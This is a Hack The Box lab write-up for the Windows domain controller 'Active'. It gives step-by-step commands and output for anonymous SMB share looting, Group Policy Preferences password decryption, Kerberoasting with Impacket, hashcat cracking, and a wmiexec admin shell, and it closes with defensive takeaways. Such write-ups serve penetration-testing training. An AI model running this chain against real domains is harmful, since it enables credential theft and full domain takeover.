# Active (HTB)

> Platform: Hack The Box  
> OS: Windows  
> Difficulty: Easy  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -p- --min-rate=5000 -T4 -Pn -n active.htb → 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5722, 9389, 47001, +high RPC ports
├── nmap -sC -sV → Microsoft DNS 6.1.7601, Domain: active.htb, Host: DC, OS: Windows Server 2008 R2 SP1
└── /etc/hosts: 10.129.84.160 active.htb dc.active.htb

Foothold (Anonymous SMB -> GPP cpassword)
├── smbclient -L //10.129.84.160/ -N → anonymous login successful
├── Share Replication readable anonymously (SYSVOL replica)
├── smbclient //.../Replication -N -c 'recurse ON; mget *' → Groups.xml
├── Groups.xml: cpassword="<GPP_CPASSWORD>"
└── gpp-decrypt → SVC_TGS:<PASSWORD>

Authenticated Enumeration
├── smbclient -L //10.129.84.160/ -U 'SVC_TGS%<PASSWORD>' → Users, SYSVOL, Replication readable
├── smbclient //.../Users -c 'get user.txt' → <USER_FLAG>
└── GetUserSPNs.py -request → SPN active/CIFS:445 on Administrator → tgs.hash

Privilege Escalation (Kerberoasting -> Domain Admin)
├── hashcat -m 13100 tgs.hash rockyou.txt → Administrator:<PASSWORD>
└── wmiexec.py active.htb/Administrator:<PASSWORD>@10.129.84.160 → shell
    └── type C:\Users\Administrator\Desktop\root.txt → <ROOT_FLAG>
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Windows Server 2008 R2 SP1 Domain Controller (`DC`) for the `active.htb` domain. The port profile (53 DNS, 88 Kerberos, 389/3268 LDAP, 445 SMB, 464 kpasswd, 636 LDAPS, 3269 GC-LDAPS, 9389 AD Web Services) is a textbook Active Directory signature. SMB signing is enabled and required - SMB relay is not possible.

Two very common AD misconfigurations make this machine exploitable: anonymous SMB access to the SYSVOL replica (`Replication` share) that contains Group Policy Preferences credentials, and a highly privileged account (`Administrator`) with a Service Principal Name set, which enables Kerberoasting.

---

## Reconnaissance

### Port Scan

Full TCP sweep with `--min-rate=5000` for speed, then a focused service scan on the discovered ports:

```bash
mkdir -p ~/Desktop/active/scans; cd ~/Desktop/active/scans
nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n active.htb -oA scans/quick
nmap -sC -sV -Pn -n --open -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 active.htb -oA scans/detail
```

**Result (detail):**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: ...)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
...
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
```

Port summary:

| Port  | Service       | Notes                                     |
|-------|---------------|-------------------------------------------|
| 53    | DNS           | Microsoft DNS 6.1.7601                    |
| 88    | Kerberos      | Windows Kerberos                          |
| 135   | MSRPC         | Windows RPC                               |
| 139   | NetBIOS-SSN   | Legacy SMB                                |
| 389   | LDAP          | Domain: active.htb                        |
| 445   | SMB           | Signing enabled and required              |
| 464   | kpasswd5      | Kerberos password change                  |
| 593   | RPC over HTTP | ncacn_http                                |
| 636   | LDAPS         | tcpwrapped                                |
| 3268  | GC-LDAP       | Global Catalog LDAP                       |
| 3269  | GC-LDAPS      | tcpwrapped                                |
| 5722  | DFSR RPC      | Distributed File System Replication       |
| 9389  | AD Web Svcs   | .NET Message Framing                      |
| 47001 | HTTP          | Microsoft HTTPAPI                         |

Add the host to `/etc/hosts`:

```bash
echo "10.129.84.160    active.htb dc.active.htb" | sudo tee -a /etc/hosts
```

**Key observation:** `dns-nsid` reveals `Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)` and LDAP reports the domain `active.htb`. This is a legacy DC (2008 R2) - expect GPP-style misconfigurations, RC4-only Kerberos, and no modern mitigations.

---

## Foothold (Anonymous SMB -> GPP cpassword)

Anonymous SMB is allowed on the DC:

```bash
smbclient -L //10.129.84.160/ -N
```

**Result:**

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
```

The `Replication` share stands out. On a Domain Controller, `Replication` is the DFS-R replica of SYSVOL (contains Group Policy data). SYSVOL is readable by all authenticated users by design - but anonymous read access is a misconfiguration.

Download the entire share recursively:

```bash
mkdir -p ~/Desktop/active/Replication; cd ~/Desktop/active/Replication
smbclient //10.129.84.160/Replication -N -c 'recurse ON; prompt OFF; mget *'
```

**Result:**

```
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI ...
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI ...
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol ...
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml ...
...
```

Locate the Group Policy Preferences file:

```bash
find ~/Desktop/active/Replication -iname 'Groups.xml'
```

**Result:**

```
/home/kali/Desktop/active/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

Read the file:

```bash
cat "$(find ~/Desktop/active/Replication -iname 'Groups.xml' | head -1)"
```

**Result:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="<GPP_CPASSWORD>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

The `cpassword` attribute is the encrypted password. Microsoft published the AES-256 key used by GPP in 2012 (MSDN [MS-GPPREF] 2.2.1.1.4), so decryption is trivial:

```bash
gpp-decrypt '<GPP_CPASSWORD>'
```

**Result:**

```
<PASSWORD>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Credentials recovered: `active.htb\SVC_TGS : <PASSWORD>`.

---

## Authenticated Enumeration

Verify access with the recovered credentials:

```bash
smbclient -L //10.129.84.160/ -U 'active.htb\SVC_TGS%<PASSWORD>'
```

**Result:** `Users`, `SYSVOL`, and `Replication` are readable. `ADMIN$`, `C$`, `IPC$` are not accessible with a non-admin account.

The user flag lives on the `Users` share:

```bash
smbclient //10.129.84.160/Users -U 'active.htb\SVC_TGS%<PASSWORD>' -c 'cd "SVC_TGS\Desktop"; ls; get user.txt'
cat user.txt
```

**Result:**

```
<USER_FLAG>
```

Next, enumerate accounts with a Service Principal Name - these are Kerberoastable. Impacket's GetUserSPNs.py authenticates as SVC_TGS and requests a TGS-REP ticket for every SPN it can see:

```bash
GetUserSPNs.py active.htb/SVC_TGS:<PASSWORD> -dc-ip 10.129.84.160 -request -outputfile ~/Desktop/active/tgs.hash
```

**Result:**

```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 23:06:40.351723  ...
```

**Key observation:** the account `Administrator` itself has an SPN (`active/CIFS:445`). Because `Administrator` is a Domain Admin, the TGS-REP ticket is encrypted with the NTLM hash of the Domain Admin account - cracking it yields full domain compromise.

The hash is written to `~/Desktop/active/tgs.hash`:

```bash
ls -l ~/Desktop/active/tgs.hash
wc -c ~/Desktop/active/tgs.hash
```

---

## Exploitation

No CVE (custom vulnerability) - Group Policy Preferences store the `cpassword` value encrypted with a static AES-256 key published by Microsoft (MSDN [MS-GPPREF] 2.2.1.1.4, 2012); SYSVOL is readable by all authenticated users by design. Anonymous read access to a SYSVOL replica exposed the encrypted password to an unauthenticated attacker.

No CVE (design weakness) - Kerberoasting abuses the legitimate Kerberos TGS-REQ / TGS-REP flow; any authenticated user can request a service ticket for any SPN and crack it offline because the ticket is encrypted with the service account's NTLM hash. No vulnerability in the protocol - only a weak, dictionary-based service account password.

---

## Privilege Escalation (Kerberoasting -> Domain Admin)

Crack the TGS-REP hash. The format is `$krb5tgs$23$...` (etype 23, RC4-HMAC), which corresponds to hashcat mode `13100`:

```bash
hashcat -m 13100 ~/Desktop/active/tgs.hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

**Result:**

```
hashcat (v7.1.2) starting
...
$krb5tgs$23$*Administrator$ACTIVE.HTB$...:<PASSWORD>
...
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...651dcc
Time.Started.....: ... (5 secs)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Credentials recovered: `active.htb\Administrator : <PASSWORD>`.

The account is a Domain Admin. Impacket's wmiexec.py gives a semi-interactive shell over WMI/SMB:

```bash
wmiexec.py active.htb/Administrator:<PASSWORD>@10.129.84.160
```

**Result:**

```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
active\administrator

C:\>type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value       |
|------|-------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Anonymous SMB on a Domain Controller is a critical misconfiguration.** The `Replication` share exposed a full replica of SYSVOL to unauthenticated users. SYSVOL is designed to be readable by authenticated users, but never anonymously.
- **Group Policy Preferences (GPP) `cpassword` is effectively plaintext.** Microsoft published the AES-256 key in 2012 (MSDN [MS-GPPREF] 2.2.1.1.4) and patched new GPP deployments in MS14-025, but the patch does not remove existing `cpassword` values from SYSVOL. Never store credentials in GPP.
- **Do not attach SPNs to highly privileged accounts.** Here, `Administrator` itself had an SPN (`active/CIFS:445`). Any authenticated user (including the low-privilege `SVC_TGS`) could request its TGS-REP and crack it offline, giving immediate Domain Admin access.
- **Kerberoasting is a design weakness, not a vulnerability.** The defense is long, randomly generated service-account passwords (or gMSA with automatic rotation), not patching the protocol. Monitor for unusual TGS-REQ volume (Event ID 4769 with RC4 encryption).
- **RC4 (etype 23) makes Kerberoasting fast.** In 2026 Microsoft formally associated RC4-based Kerberoasting with CVE-2026-20833 (Kerberos information disclosure, CVSS 5.5) and began disabling RC4 by default on Domain Controllers (enforcement from July 2026). The `active.htb` domain in this walkthrough still used RC4 at the time of the attack.
- **SMB signing enabled and required** prevented SMB relay - the machine was hardened against one class of attack while remaining vulnerable to others.
- **Layered failure:** a single leaked low-privilege service-account password (`SVC_TGS`) was enough, because the default AD permission model allows any authenticated user to request service tickets for any SPN, and the most privileged account in the domain was Kerberoastable.
